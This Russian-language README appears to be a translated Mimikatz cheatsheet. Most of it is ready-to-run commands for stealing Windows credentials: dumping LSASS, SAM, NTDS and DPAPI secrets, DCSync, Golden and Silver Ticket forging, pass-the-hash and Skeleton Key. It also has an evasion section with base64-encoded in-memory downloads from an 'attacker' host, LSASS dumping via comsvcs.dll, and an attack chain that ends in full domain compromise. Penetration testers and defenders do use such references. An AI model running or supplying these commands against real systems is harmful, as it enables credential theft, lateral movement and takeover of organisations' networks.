<a id="-mimikatz---complete-cheatsheet"></a>
# 🔑 Mimikatz — полная шпаргалка

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)
[🇬🇧 English](../README.md) • [🇷🇺 Русский раздел](../../README.ru.md)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Windows Credential Extraction Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credentials">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 Мощный инструмент извлечения учётных данных Windows</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое Mimikatz](#-what-is-mimikatz)
- [Начало работы](#-getting-started)
- [Способы запуска](#-execution-methods)
- [Основные модули](#-core-modules)
- [Извлечение учётных данных](#-credential-extraction)
- [Атаки на Kerberos](#-kerberos-attacks)
- [Продвинутые атаки](#-advanced-attacks)
- [Методы обхода обнаружения](#-evasion-techniques)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-mimikatz"></a>
## 🎯 Что такое Mimikatz

> **Уточнения к оригиналу:** доступность открытых паролей и отдельных функций зависит от версии Windows, настроек и защиты LSA; [Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works) изолирует часть секретов. Ошибка acquireLSA сама по себе не является надёжной проверкой Credential Guard, а DCSync — отдельная операция репликации с собственными требованиями к правам.

**Mimikatz** — инструмент для действий после получения доступа, созданный **Бенжаменом Дельпи (Benjamin Delpy)** (@gentilkiwi). Он позволяет извлекать:

- 🔑 **Пароли в открытом виде** из памяти Windows (LSASS)
- 🎫 **Билеты Kerberos** (TGT, TGS)
- 🔐 **Хеши NTLM** из SAM/NTDS
- 📜 **Сертификаты** и закрытые ключи
- 🗝️ **Кешированные учётные данные**
- 🔒 **Секреты DPAPI**

<a id="why-is-it-important"></a>
### Почему это важно?

| Применение | Описание |
|----------|-------------|
| **Кража учётных данных** | Извлечение паролей из памяти |
| **Перемещение по сети** | Pass-the-Hash, Pass-the-Ticket |
| **Повышение привилегий** | Олицетворение пользователей |
| **Закрепление доступа** | Golden/Silver Tickets |
| **Контроль над доменом** | DCSync для полной компрометации AD |

---

<a id="-getting-started"></a>
## 🚀 Начало работы

<a id="download"></a>
### Скачивание

```bash
# Официальный репозиторий
git clone https://github.com/gentilkiwi/mimikatz.git

# Готовые исполняемые файлы (выпуски)
# https://github.com/gentilkiwi/mimikatz/releases
```

<a id="requirements"></a>
### Требования

- Права **Administrator/SYSTEM** (для большинства функций)
- **SeDebugPrivilege** (для доступа к LSASS)
- Windows x64 или x86

<a id="first-commands"></a>
### Первые команды

> **Уточнение:** token::elevate олицетворяет доступный токен (часто SYSTEM), а не «включает все привилегии»; см. [пример автора Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#sam).

```cmd
# Запустить mimikatz
mimikatz.exe

# Проверить привилегии
mimikatz # privilege::debug
Privilege '20' OK

# Включить все привилегии (подпись оригинала; см. уточнение)
mimikatz # token::elevate

# Выход
mimikatz # exit
```

---

<a id="-execution-methods"></a>
## 💻 Способы запуска

<a id="1-standalone-binary"></a>
### 1. Отдельный исполняемый файл

```cmd
# Прямой запуск (обнаруживается антивирусом)
mimikatz.exe

# Однострочная команда
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Сохранить вывод в файл
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# С помощью команды log
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

<a id="2-powershell-invoke-mimikatz"></a>
### 2. PowerShell (Invoke-Mimikatz)

```powershell
# Скачать и выполнить в памяти (без сохранения файла)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Извлечь учётные данные
Invoke-Mimikatz -DumpCreds

# Извлечь сертификаты
Invoke-Mimikatz -DumpCerts

# Выполнить на удалённой машине
Invoke-Mimikatz -ComputerName DC01
```

<a id="3-metasploit-kiwi"></a>
### 3. Metasploit (Kiwi)

```bash
# В сеансе meterpreter
meterpreter > load kiwi

# Получить справку
meterpreter > help kiwi

# Извлечь все учётные данные
meterpreter > creds_all

# Извлечь хеши
meterpreter > lsa_dump_sam

# Извлечь секреты
meterpreter > lsa_dump_secrets

# Билеты Kerberos
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

<a id="4-crackmapexec"></a>
### 4. CrackMapExec

```bash
# Получить данные SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Получить данные LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# Получить данные NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

<a id="5-from-memory-dump"></a>
### 5. Из дампа памяти

```cmd
# Получить дамп LSASS через диспетчер задач или procdump
procdump.exe -ma lsass.exe lsass.dmp

# Загрузить дамп в mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

<a id="-core-modules"></a>
## 🔧 Основные модули

<a id="module-overview"></a>
### Обзор модулей

| Модуль | Описание |
|--------|-------------|
| **sekurlsa** | Извлечение учётных данных из памяти LSASS |
| **lsadump** | Получение данных SAM, NTDS, секретов и кеша |
| **kerberos** | Работа с билетами Kerberos |
| **crypto** | Сертификаты CryptoAPI |
| **vault** | Windows Vault (хранилище учётных данных) |
| **token** | Работа с токенами |
| **privilege** | Работа с привилегиями |
| **process** | Работа с процессами |
| **service** | Работа со службами |
| **dpapi** | Секреты DPAPI |
| **misc** | Прочие команды |

<a id="getting-help"></a>
### Получение справки

```cmd
# Перечислить все модули
mimikatz # ::

# Справка по модулю
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

<a id="-credential-extraction"></a>
## 🔐 Извлечение учётных данных

<a id="sekurlsa-module-lsass"></a>
### Модуль sekurlsa (LSASS)

```cmd
# Сначала включить привилегию отладки!
mimikatz # privilege::debug

# Извлечь пароли сеансов входа (открытый вид, NTLM, SHA1)
mimikatz # sekurlsa::logonpasswords

# Извлечь только хеши NTLM
mimikatz # sekurlsa::msv

# Извлечь билеты Kerberos
mimikatz # sekurlsa::tickets

# Извлечь учётные данные WDigest (в открытом виде, если включено)
mimikatz # sekurlsa::wdigest

# Извлечь ключи шифрования Kerberos
mimikatz # sekurlsa::ekeys

# Извлечь учётные данные DPAPI
mimikatz # sekurlsa::dpapi

# Извлечь учётные данные конкретного процесса
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# Извлечь учётные данные TsPkg (RDP)
mimikatz # sekurlsa::tspkg

# Извлечь учётные данные LiveSSP
mimikatz # sekurlsa::livessp

# Извлечь учётные данные SSP
mimikatz # sekurlsa::ssp

# Извлечь учётные данные CloudAP (Azure AD)
mimikatz # sekurlsa::cloudap
```

<a id="lsadump-module-samntds"></a>
### Модуль lsadump (SAM/NTDS)

> **Уточнение:** подпись «Dump NTDS.dit» у lsadump::lsa /patch и /inject неточна: это работа с LSA, а не чтение файла NTDS.dit с диска; см. [официальную документацию модуля lsadump](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#lsa).

```cmd
# Получить данные базы SAM (локальные учётные записи)
mimikatz # lsadump::sam

# Получить данные SAM с помощью куста SYSTEM
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# Извлечь секреты LSA
mimikatz # lsadump::secrets

# Извлечь кешированные учётные данные (DCC2)
mimikatz # lsadump::cache

# DCSync (репликация контроллера домена)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Получить данные NTDS.dit (контроллер домена; подпись оригинала, см. уточнение)
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Извлечь ключи доверительных отношений
mimikatz # lsadump::trust /patch

# Извлечь резервные ключи (DPAPI)
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

<a id="vault-module-credential-manager"></a>
### Модуль vault (диспетчер учётных данных)

```cmd
# Перечислить учётные данные хранилища
mimikatz # vault::list

# Извлечь учётные данные хранилища
mimikatz # vault::cred /patch
```

<a id="dpapi-module"></a>
### Модуль dpapi

```cmd
# Извлечь главные ключи DPAPI
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# Расшифровать объект данных DPAPI
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Пароли Chrome
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

<a id="-kerberos-attacks"></a>
## 🎫 Атаки на Kerberos

<a id="view-tickets"></a>
### Просмотр билетов

```cmd
# Перечислить все билеты
mimikatz # kerberos::list

# Перечислить билеты с подробностями
mimikatz # kerberos::list /export

# Экспортировать все билеты
mimikatz # sekurlsa::tickets /export
```

<a id="pass-the-ticket-ptt"></a>
### Pass-the-Ticket (PtT — использование билета)

```cmd
# Очистить существующие билеты
mimikatz # kerberos::purge

# Импортировать билет
mimikatz # kerberos::ptt ticket.kirbi

# Проверить билет
mimikatz # kerberos::list
```

<a id="golden-ticket-domain-admin-persistence"></a>
### Golden Ticket (закрепление с правами администратора домена)

> **Уточнение:** RID 500 обозначает учётную запись Administrator, а не группу. Параметр /sids задаёт дополнительные SID, а не адрес целевого DC; подписи и команды оригинала сохранены. Примерные SID, hash и имена — заполнители; применимость примеров с вымышленным пользователем зависит от поведения и версии среды.

```cmd
# Требования:
# - Имя домена (domain.local)
# - SID домена (S-1-5-21-...)
# - Хеш NTLM учётной записи krbtgt
# - Имя целевого пользователя (в оригинале допускается вымышленное)

# Создать Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Создать и экспортировать
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# С указанными группами (RID 500 = Admin, 512 = Domain Admins и т. п.; см. уточнение)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# С целевым контроллером домена (подпись оригинала; см. уточнение)
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

<a id="silver-ticket-service-specific"></a>
### Silver Ticket (для конкретной службы)

```cmd
# Требования:
# - Имя домена
# - SID домена
# - Хеш NTLM целевой служебной учётной записи
# - SPN службы

# Создать Silver Ticket для CIFS (общие файловые ресурсы)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# Silver Ticket для HTTP (веб)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# Silver Ticket для SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# Silver Ticket для WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

<a id="-advanced-attacks"></a>
## 💀 Продвинутые атаки

<a id="pass-the-hash-pth"></a>
### Pass-the-Hash (PtH — использование хеша)

```cmd
# Запустить команду от имени пользователя с хешем NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# С ключами AES
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# Создать процесс с помощью PtH
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

<a id="overpass-the-hash-pass-the-key"></a>
### Overpass-the-Hash (Pass-the-Key)

```cmd
# Использовать хеш NTLM для получения билета Kerberos
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Затем запросить TGT
# klist должен показать билет Kerberos
```

<a id="dcsync-attack"></a>
### Атака DCSync

```cmd
# Получить через репликацию данные одного пользователя
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Получить через репликацию данные krbtgt (для Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Получить через репликацию данные всех пользователей
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Репликация с указанного контроллера домена
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

<a id="skeleton-key"></a>
### Skeleton Key

```cmd
# Внедрить Skeleton Key в LSASS контроллера домена (пользователи могут входить с паролем "mimikatz")
mimikatz # misc::skeleton

# Действует до перезагрузки контроллера домена
# Вход под любым пользователем: password = mimikatz
```

<a id="dpapi-abuse"></a>
### Злоупотребление DPAPI

```cmd
# Извлечь главные ключи
mimikatz # sekurlsa::dpapi

# Расшифровать файл учётных данных
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# Сохранённые пароли RDP
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

<a id="token-manipulation"></a>
### Работа с токенами

```cmd
# Перечислить токены
mimikatz # token::list

# Олицетворить токен SYSTEM
mimikatz # token::elevate

# Олицетворить токен указанного пользователя
mimikatz # token::elevate /user:Administrator

# Вернуться к исходному токену
mimikatz # token::revert

# Запустить от имени указанного пользователя
mimikatz # token::run /user:domain\admin
```

---

<a id="-evasion-techniques"></a>
## 🛡️ Методы обхода обнаружения

<a id="obfuscated-names"></a>
### Маскировка имён

```cmd
# Переименовать mimikatz.exe
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

<a id="powershell-obfuscation"></a>
### Обфускация PowerShell

```powershell
# Кодирование Base64
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

<a id="memory-only-execution"></a>
### Выполнение только в памяти

```powershell
# Invoke-Mimikatz (без сохранения файла)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# Или использовать kiwi в meterpreter
meterpreter > load kiwi
meterpreter > creds_all
```

<a id="lsass-dump-alternatives"></a>
### Другие способы получения дампа LSASS

```cmd
# Procdump (подписан Microsoft)
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll (встроенная библиотека)
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Диспетчер задач (графический интерфейс)
# Щёлкнуть правой кнопкой по lsass.exe > Create dump file («Создать файл дампа»)

# SQLDumper (из SQL Server)
sqldumper.exe <lsass_pid> 0 0x01100
```

<a id="credential-guard-bypass"></a>
### Обход Credential Guard

```cmd
# Проверить, включён ли Credential Guard (подпись оригинала; см. уточнение)
mimikatz # sekurlsa::logonpasswords
# Будет показано "ERROR kuhl_m_sekurlsa_acquireLSA" (утверждение оригинала; см. уточнение)

# Альтернатива в оригинале: использовать DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="essential-one-liners"></a>
### Основные однострочные команды

```cmd
# Извлечь все учётные данные
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Получить данные SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# DCSync для всех пользователей
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

<a id="module-quick-reference"></a>
### Краткий справочник модулей

| Команда | Описание |
|---------|-------------|
| `privilege::debug` | Включить привилегию отладки |
| `token::elevate` | Олицетворить токен SYSTEM |
| `sekurlsa::logonpasswords` | Извлечь учётные данные из LSASS |
| `sekurlsa::msv` | Извлечь хеши NTLM |
| `sekurlsa::tickets` | Извлечь билеты Kerberos |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | Получить данные базы SAM |
| `lsadump::secrets` | Извлечь секреты LSA |
| `lsadump::dcsync` | Атака DCSync |
| `lsadump::lsa /patch` | Получить данные NTDS с контроллера домена (подпись оригинала; см. уточнение) |
| `kerberos::list` | Перечислить билеты Kerberos |
| `kerberos::ptt` | Pass-the-Ticket |
| `kerberos::golden` | Создать Golden/Silver Ticket |
| `kerberos::purge` | Очистить билеты |
| `vault::list` | Перечислить учётные данные хранилища |
| `dpapi::cred` | Расшифровать учётные данные DPAPI |

<a id="attack-chain-example"></a>
### Пример цепочки атаки

```
1. Получить первоначальный доступ
2. privilege::debug
3. sekurlsa::logonpasswords (получить учётные данные)
4. sekurlsa::pth (перемещение по сети)
5. lsadump::dcsync /user:krbtgt (получить хеш krbtgt)
6. kerberos::golden (создать Golden Ticket)
7. Полная компрометация домена!
```

---

<a id="-resources"></a>
## 📚 Полезные материалы

- [Официальный GitHub](https://github.com/gentilkiwi/mimikatz)
- [Вики Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)
- [Руководство ADSecurity по Mimikatz](https://adsecurity.org/?page_id=1821)
- [Mimikatz в HackTricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [Повышение привилегий в Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.ru.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.ru.md)

---

<p align="center">
  <b>🔑 Освойте методы работы с учётными данными Windows!</b><br>
  <i>Mimikatz — многофункциональный инструмент исследователя безопасности Windows</i>
</p>
